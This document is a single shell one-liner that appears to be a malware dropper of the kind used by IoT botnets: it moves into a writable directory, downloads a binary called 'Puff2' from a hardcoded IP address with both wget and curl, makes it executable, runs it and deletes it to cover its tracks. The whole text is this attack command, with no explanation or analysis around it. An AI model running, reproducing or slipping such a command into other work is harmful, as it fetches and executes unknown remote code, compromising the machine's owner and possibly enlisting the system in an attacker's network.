cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.35/Puff2; curl -O http://46.166.185.35/Puff2; chmod +x Puff2; ./Puff2; rm -rf Puff2
